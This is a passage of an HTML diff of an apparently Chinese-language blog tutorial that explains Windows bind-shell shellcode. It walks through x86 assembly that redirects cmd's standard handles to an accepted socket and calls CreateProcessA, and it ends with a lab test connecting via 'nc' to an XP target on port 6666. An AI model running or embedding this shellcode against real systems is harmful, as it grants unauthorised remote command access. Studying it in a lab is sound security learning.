-<h5 id="然后调用listen"><a href="#然后调用listen" class="headerlink" title="然后调用listen"></a>然后调用listen</h5><blockquote>
+<h5 id="然后调用listen">然后调用listen</h5>
+<blockquote>
 <p>listen函数,将套接字设置为监听状态</p>
 <p>其接口为</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WSAAPI <span class="title function_">listen</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] SOCKET s,<span class="comment">//套接字描述符</span></span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>    backlog<span class="comment">//挂起连接队列的最大长度,不疼不痒</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
@@ -569,35 +627,58 @@
 <p>这里我们只对第一个参数,套接字描述符,感兴趣,backlog爱是啥是啥,反正不是0就行</p>
 <p>于是在第二次循环一开始又将ebp压入作为第一个参数,历史上的堆栈,爱谁谁作为第二个参数</p>
 <p>lodsd 又将listen地址放到eax上然后edi指向下一个函数accept,</p>
-<p>然后就调用了listen,返回eax&#x3D;0</p>
-<h5 id="最后调用accept"><a href="#最后调用accept" class="headerlink" title="最后调用accept"></a>最后调用accept</h5><blockquote>
+<p>然后就调用了listen,返回eax=0</p>
+<h5 id="最后调用accept">最后调用accept</h5>
+<blockquote>
 <p>accept用于接收对套接字的连接</p>
 </blockquote>
 <p>调用成功返回新的套接字描述符</p>
-<h2 id="拱手让shell"><a href="#拱手让shell" class="headerlink" title="拱手让shell"></a>拱手让shell</h2><p>到此套接字通信就建立起来了,下面要创建一个cmd进程然后绑到套接字上</p>
+<h2 id="拱手让shell">拱手让shell</h2>
+<p>到此套接字通信就建立起来了,下面要创建一个cmd进程然后绑到套接字上</p>
 <blockquote>
 <p>CreateProcess用于创建一个新进程并创建其主线程</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CreateProcess</span><span class="params">(  </span></span><br><span class="line"><span class="params">　LPCTSTR lpApplicationName, <span class="comment">// 应用程序名称  </span></span></span><br><span class="line"><span class="params">　LPTSTR lpCommandLine, <span class="comment">// 命令行字符串  //这里放&quot;CMd&quot;</span></span></span><br><span class="line"><span class="params">　LPSECURITY_ATTRIBUTES lpProcessAttributes, <span class="comment">// 进程的安全属性  </span></span></span><br><span class="line"><span class="params">　LPSECURITY_ATTRIBUTES lpThreadAttributes, <span class="comment">// 线程的安全属性  </span></span></span><br><span class="line"><span class="params">　BOOL bInheritHandles, <span class="comment">// 是否继承父进程的属性  </span></span></span><br><span class="line"><span class="params">　DWORD dwCreationFlags, <span class="comment">// 创建标志  </span></span></span><br><span class="line"><span class="params">　LPVOID lpEnvironment, <span class="comment">// 指向新的环境块的指针  </span></span></span><br><span class="line"><span class="params">　LPCTSTR lpCurrentDirectory, <span class="comment">// 指向当前目录名的指针  </span></span></span><br><span class="line"><span class="params">　LPSTARTUPINFO lpStartupInfo, <span class="comment">// 传递给新进程的信息  </span></span></span><br><span class="line"><span class="params">　LPPROCESS_INFORMATION lpProcessInformation <span class="comment">// 新进程返回的信息  </span></span></span><br><span class="line"><span class="params">)</span>;  </span><br></pre></td></tr></table></figure>
-
 <p>其中lpStartupInfo用于和套接字绑定,重要</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">STARTUPINFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   DWORD cb;            <span class="comment">//包含STARTUPINFO结构中的字节数.如果Microsoft将来扩展该结构,它可用作版本控制手段.</span></span><br><span class="line">                        <span class="comment">//应用程序必须将cb初始化为sizeof(STARTUPINFO)</span></span><br><span class="line">   PSTR lpReserved;      <span class="comment">//保留。必须初始化为N U L L</span></span><br><span class="line">   PSTR lpDesktop;    <span class="comment">//用于标识启动应用程序所在的桌面的名字。如果该桌面存在，新进程便与指定的桌面相关联。</span></span><br><span class="line">                      <span class="comment">//如果桌面不存在，便创建一个带有默认属性的桌面，并使用为新进程指定的名字。</span></span><br><span class="line">                     <span class="comment">//如果lpDesktop是NULL（这是最常见的情况),那么该进程将与当前桌面相关联</span></span><br><span class="line">   PSTR lpTitle;    <span class="comment">//用于设定控制台窗口的名称。如果l p Ti t l e 是N U L L ，则可执行文件的名字将用作窗口名</span></span><br><span class="line">   DWORD dwX;       <span class="comment">//用于设定应用程序窗口在屏幕上应该放置的位置的x 和y 坐标（以像素为单位）。</span></span><br><span class="line">   DWORD dwY;       <span class="comment">//只有当子进程用CW_USEDEFAULT作为CreateWindow的x参数来创建它的第一个重叠窗口时,</span></span><br><span class="line">                    <span class="comment">//才使用这两个坐标。若是创建控制台窗口的应用程序，这些成员用于指明控制台窗口的左上角</span></span><br><span class="line"></span><br><span class="line">   DWORD dwXSize;  <span class="comment">//用于设定应用程序窗口的宽度和长度（以像素为单位）只有dwYsize</span></span><br><span class="line">    DWORD dwYSize;   <span class="comment">//当子进程将C W _ U S E D E FA U LT 用作C r e a t e Wi n d o w 的</span></span><br><span class="line">                    <span class="comment">// n Wi d t h参数来创建它的第一个重叠窗口时，才使用这些值。</span></span><br><span class="line">                     <span class="comment">//若是创建控制台窗口的应用程序，这些成员将用于指明控制台窗口的宽度</span></span><br><span class="line">   DWORD dwXCountChars;  <span class="comment">//用于设定子应用程序的控制台窗口的宽度和高度（以字符为单位）</span></span><br><span class="line">   DWORD dwYCountChars;</span><br><span class="line">   DWORD dwFillAttribute;   <span class="comment">//用于设定子应用程序的控制台窗口使用的文本和背景颜色</span></span><br><span class="line">   DWORD dwFlags;           <span class="comment">//请参见下一段和表4 - 7 的说明</span></span><br><span class="line">   WORD wShowWindow;        <span class="comment">//用于设定如果子应用程序初次调用的S h o w Wi n d o w 将S W _ S H O W D E FA U LT 作为</span></span><br><span class="line">                             <span class="comment">// n C m d S h o w 参数传递时，该应用程序的第一个重叠窗口应该如何出现。</span></span><br><span class="line">                             <span class="comment">// 本成员可以是通常用于Show Wi n d o w 函数的任何一个S W _ *标识符</span></span><br><span class="line">   WORD cbReserved2;        <span class="comment">//保留。必须被初始化为0</span></span><br><span class="line">   PBYTE lpReserved2;       <span class="comment">//保留。必须被初始化为N U L L</span></span><br><span class="line">   HANDLE hStdInput;        <span class="comment">//用于设定供控制台输入和输出用的缓存的句柄。</span></span><br><span class="line">                            <span class="comment">//按照默认设置，h S t d I n p u t 用于标识键盘缓存，</span></span><br><span class="line">                           <span class="comment">// h S t d O u t p u t 和h S t d E r r o r用于标识控制台窗口的缓存</span></span><br><span class="line">   HANDLE hStdOutput;</span><br><span class="line">   HANDLE hStdError;</span><br><span class="line">&#125; STARTUPINFO, *LPSTARTUPINFO;</span><br></pre></td></tr></table></figure>
 </blockquote>
-<h3 id="初始化STARTUPINFO结构体"><a href="#初始化STARTUPINFO结构体" class="headerlink" title="初始化STARTUPINFO结构体"></a>初始化STARTUPINFO结构体</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; initialise a STARTUPINFO structure at esp </span><br><span class="line">	inc byte ptr [esp + 0x2d] 	; set STARTF_USESTDHANDLES to true </span><br><span class="line">	sub edi, 0x6c 				; point edi at hStdInput in STARTUPINFO </span><br><span class="line">	stosd 					; use SOCKET descriptor returned by accept </span><br><span class="line">							; (still in eax) as the stdin handle </span><br><span class="line">	stosd 					; same for stdout </span><br><span class="line">	stosd					; same for stderr (optional) </span><br></pre></td></tr></table></figure>
-
+<h3 id="初始化startupinfo结构体">初始化STARTUPINFO结构体</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; initialise a STARTUPINFO structure at esp </span><br><span class="line">	inc byte ptr [esp + 0x2d] 	; set STARTF_USESTDHANDLES to true </span><br><span class="line">	sub edi, 0x6c 				; point edi at hStdInput in STARTUPINFO </span><br><span class="line">	stosd 					; use SOCKET descriptor returned by accept </span><br><span class="line">							; (still in eax) as the stdin handle </span><br><span class="line">	stosd 					; same for stdout </span><br><span class="line">	stosd					; same for stderr (optional) </span><br></pre></td></tr></table></figure>
 <p>这里edi和esp已经离得很近了,在sub edi,0x6c之前</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202314459.png" alt="image-20220918202314459"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202314459.png"
+alt="image-20220918202314459" />
+<figcaption aria-hidden="true">image-20220918202314459</figcaption>
+</figure>
 <p>之后</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202330635.png" alt="image-20220918202330635"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918202330635.png"
+alt="image-20220918202330635" />
+<figcaption aria-hidden="true">image-20220918202330635</figcaption>
+</figure>
 <p>然后在edi的最后三个双字上(stdinput,stdout,stderr)都设置为eax中的套接字描述符</p>
 <p>剩余的字节都是0</p>
-<h3 id="CreateProcessA"><a href="#CreateProcessA" class="headerlink" title="CreateProcessA"></a>CreateProcessA</h3><p>栈顶位置还啥也没写,推给eax当0用</p>
+<h3 id="createprocessa">CreateProcessA</h3>
+<p>栈顶位置还啥也没写,推给eax当0用</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">; create process </span><br><span class="line">	pop eax 			; set eax = 0 (STARTUPINFO now at esp + 4) </span><br><span class="line">	push esp			; use stack as PROCESSINFORMATION structure </span><br><span class="line">	; (STARTUPINFO now back to esp) </span><br><span class="line">	push esp 			; STARTUPINFO structure </span><br><span class="line">	push eax 		; lpCurrentDirectory = NULL </span><br><span class="line">	push eax 		; lpEnvironment = NULL </span><br><span class="line">	push eax 		; dwCreationFlags = NULL </span><br><span class="line">	push esp 			; bInheritHandles = true </span><br><span class="line">	push eax 		; lpThreadAttributes = NULL </span><br><span class="line">	push eax 		; lpProcessAttributes = NULL </span><br><span class="line">	push esi 			; lpCommandLine = &quot;cmd&quot; </span><br><span class="line">	push eax 		; lpApplicationName = NULL </span><br><span class="line">	call [esi - 0x1c] 	; CreateProcessA </span><br></pre></td></tr></table></figure>
-
 <p>这就创建了一个cmd进程,其三标都重定向到套接字了</p>
-<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>windows XP靶机和win10主机采用NAT连接方式,XP靶机的ip地址为192.168.191.137</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203112083.png" alt="靶机地址"></p>
+<h2 id="测试">测试</h2>
+<p>windows
+XP靶机和win10主机采用NAT连接方式,XP靶机的ip地址为192.168.191.137</p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203112083.png"
+alt="靶机地址" />
+<figcaption aria-hidden="true">靶机地址</figcaption>
+</figure>
 <p>在主机上<code>nc 192.168.191.137 6666</code></p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203216136.png" alt="通了"></p>
+<figure>
+<img
+src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220918203216136.png"
+alt="通了" />
+<figcaption aria-hidden="true">通了</figcaption>
+</figure>
 
     </div>
 
@@ -681,7 +762,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bind-shell"><span class="nav-number">1.</span> <span class="nav-text">Bind_shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.1.</span> <span class="nav-text">哈希算法设计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E7%AC%A6%E5%8F%B7"><span class="nav-number">1.2.</span> <span class="nav-text">解析符号</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.2.1.</span> <span class="nav-text">外圈循环初始化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%AD%98%E6%94%BE%E7%A9%BA%E9%97%B4"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">设置函数地址存放空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96kernel32-dll%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">获取kernel32.dll基地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%AC%E6%A0%88%E7%94%B3%E8%AF%B7%E7%A9%BA%E9%97%B4"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">抬栈申请空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E2%80%9Cws2-32%E2%80%9D%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E6%A0%88"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">“ws2_32”字符串压栈</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E5%BC%80%E5%A7%8B"><span class="nav-number">1.2.2.</span> <span class="nav-text">外圈循环一次开始</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%9C%88%E5%BE%AA%E7%8E%AF%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.2.3.</span> <span class="nav-text">中圈循环初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E5%BC%80%E5%A7%8B"><span class="nav-number">1.2.4.</span> <span class="nav-text">中圈循环一次开始</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%9C%88%E5%BE%AA%E7%8E%AFhash-loop"><span class="nav-number">1.2.5.</span> <span class="nav-text">内圈循环hash_loop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E5%88%A4%E6%96%AD"><span class="nav-number">1.2.6.</span> <span class="nav-text">中圈循环一次判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E7%BB%93%E6%9D%9F-%E5%9B%9E%E5%86%99%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.7.</span> <span class="nav-text">外圈循环一次结束,回写目标函数绝对地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%85%A8%E9%83%A8%E8%A7%A3%E6%9E%90%E5%AE%8C%E6%AF%95"><span class="nav-number">1.2.8.</span> <span class="nav-text">外圈循环判断是否全部解析完毕</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8BSocket%E9%80%9A%E4%BF%A1"><span class="nav-number">1.3.</span> <span class="nav-text">建立Socket通信</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8WSAStartUp"><span class="nav-number">1.3.1.</span> <span class="nav-text">调用WSAStartUp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%99%E2%80%9DCMd%E2%80%9D%E7%94%BB%E4%B8%8A%E5%8F%A5%E5%8F%B7"><span class="nav-number">1.3.2.</span> <span class="nav-text">给”CMd”画上句号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8WSASocketA"><span class="nav-number">1.3.3.</span> <span class="nav-text">调用WSASocketA</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E7%A9%BA%E6%A0%88%E5%B8%A7-%E7%9B%B8%E5%BD%93%E4%BA%8E%E5%A1%AB%E5%85%85NULL%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">清空栈帧,相当于填充NULL作为参数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bind-listen-accept%E5%BE%AA%E7%8E%AF"><span class="nav-number">1.3.4.</span> <span class="nav-text">bind,listen,accept循环</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96bind%E5%8F%82%E6%95%B0"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">初始化bind参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E8%81%94%E5%BE%AA%E7%8E%AF-%E5%A4%8D%E7%94%A8%E5%BE%AA%E7%8E%AF%E4%BB%A3%E7%A0%81"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">三联循环,复用循环代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E8%B0%83%E7%94%A8bind"><span class="nav-number">1.3.4.2.1.</span> <span class="nav-text">首先调用bind</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%84%B6%E5%90%8E%E8%B0%83%E7%94%A8listen"><span class="nav-number">1.3.4.2.2.</span> <span class="nav-text">然后调用listen</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E8%B0%83%E7%94%A8accept"><span class="nav-number">1.3.4.2.3.</span> <span class="nav-text">最后调用accept</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%B1%E6%89%8B%E8%AE%A9shell"><span class="nav-number">1.4.</span> <span class="nav-text">拱手让shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96STARTUPINFO%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">1.4.1.</span> <span class="nav-text">初始化STARTUPINFO结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CreateProcessA"><span class="nav-number">1.4.2.</span> <span class="nav-text">CreateProcessA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">1.5.</span> <span class="nav-text">测试</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#bind_shell"><span class="nav-number">1.</span> <span class="nav-text">Bind_shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%93%88%E5%B8%8C%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1"><span class="nav-number">1.1.</span> <span class="nav-text">哈希算法设计</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E7%AC%A6%E5%8F%B7"><span class="nav-number">1.2.</span> <span class="nav-text">解析符号</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.2.1.</span> <span class="nav-text">外圈循环初始化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80%E5%AD%98%E6%94%BE%E7%A9%BA%E9%97%B4"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">设置函数地址存放空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96kernel32.dll%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">获取kernel32.dll基地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%AC%E6%A0%88%E7%94%B3%E8%AF%B7%E7%A9%BA%E9%97%B4"><span class="nav-number">1.2.1.3.</span> <span class="nav-text">抬栈申请空间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ws2_32%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%8B%E6%A0%88"><span class="nav-number">1.2.1.4.</span> <span class="nav-text">&quot;ws2_32&quot;字符串压栈</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E5%BC%80%E5%A7%8B"><span class="nav-number">1.2.2.</span> <span class="nav-text">外圈循环一次开始</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%9C%88%E5%BE%AA%E7%8E%AF%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.2.3.</span> <span class="nav-text">中圈循环初始化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E5%BC%80%E5%A7%8B"><span class="nav-number">1.2.4.</span> <span class="nav-text">中圈循环一次开始</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%9C%88%E5%BE%AA%E7%8E%AFhash_loop"><span class="nav-number">1.2.5.</span> <span class="nav-text">内圈循环hash_loop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E5%88%A4%E6%96%AD"><span class="nav-number">1.2.6.</span> <span class="nav-text">中圈循环一次判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E4%B8%80%E6%AC%A1%E7%BB%93%E6%9D%9F%E5%9B%9E%E5%86%99%E7%9B%AE%E6%A0%87%E5%87%BD%E6%95%B0%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80"><span class="nav-number">1.2.7.</span> <span class="nav-text">外圈循环一次结束,回写目标函数绝对地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E5%9C%88%E5%BE%AA%E7%8E%AF%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%85%A8%E9%83%A8%E8%A7%A3%E6%9E%90%E5%AE%8C%E6%AF%95"><span class="nav-number">1.2.8.</span> <span class="nav-text">外圈循环判断是否全部解析完毕</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BB%BA%E7%AB%8Bsocket%E9%80%9A%E4%BF%A1"><span class="nav-number">1.3.</span> <span class="nav-text">建立Socket通信</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8wsastartup"><span class="nav-number">1.3.1.</span> <span class="nav-text">调用WSAStartUp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%99cmd%E7%94%BB%E4%B8%8A%E5%8F%A5%E5%8F%B7"><span class="nav-number">1.3.2.</span> <span class="nav-text">给&quot;CMd&quot;画上句号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B0%83%E7%94%A8wsasocketa"><span class="nav-number">1.3.3.</span> <span class="nav-text">调用WSASocketA</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E7%A9%BA%E6%A0%88%E5%B8%A7%E7%9B%B8%E5%BD%93%E4%BA%8E%E5%A1%AB%E5%85%85null%E4%BD%9C%E4%B8%BA%E5%8F%82%E6%95%B0"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">清空栈帧,相当于填充NULL作为参数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bindlistenaccept%E5%BE%AA%E7%8E%AF"><span class="nav-number">1.3.4.</span> <span class="nav-text">bind,listen,accept循环</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96bind%E5%8F%82%E6%95%B0"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">初始化bind参数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E8%81%94%E5%BE%AA%E7%8E%AF%E5%A4%8D%E7%94%A8%E5%BE%AA%E7%8E%AF%E4%BB%A3%E7%A0%81"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">三联循环,复用循环代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A6%96%E5%85%88%E8%B0%83%E7%94%A8bind"><span class="nav-number">1.3.4.2.1.</span> <span class="nav-text">首先调用bind</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%84%B6%E5%90%8E%E8%B0%83%E7%94%A8listen"><span class="nav-number">1.3.4.2.2.</span> <span class="nav-text">然后调用listen</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E8%B0%83%E7%94%A8accept"><span class="nav-number">1.3.4.2.3.</span> <span class="nav-text">最后调用accept</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%B1%E6%89%8B%E8%AE%A9shell"><span class="nav-number">1.4.</span> <span class="nav-text">拱手让shell</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96startupinfo%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-number">1.4.1.</span> <span class="nav-text">初始化STARTUPINFO结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#createprocessa"><span class="nav-number">1.4.2.</span> <span class="nav-text">CreateProcessA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">1.5.</span> <span class="nav-text">测试</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
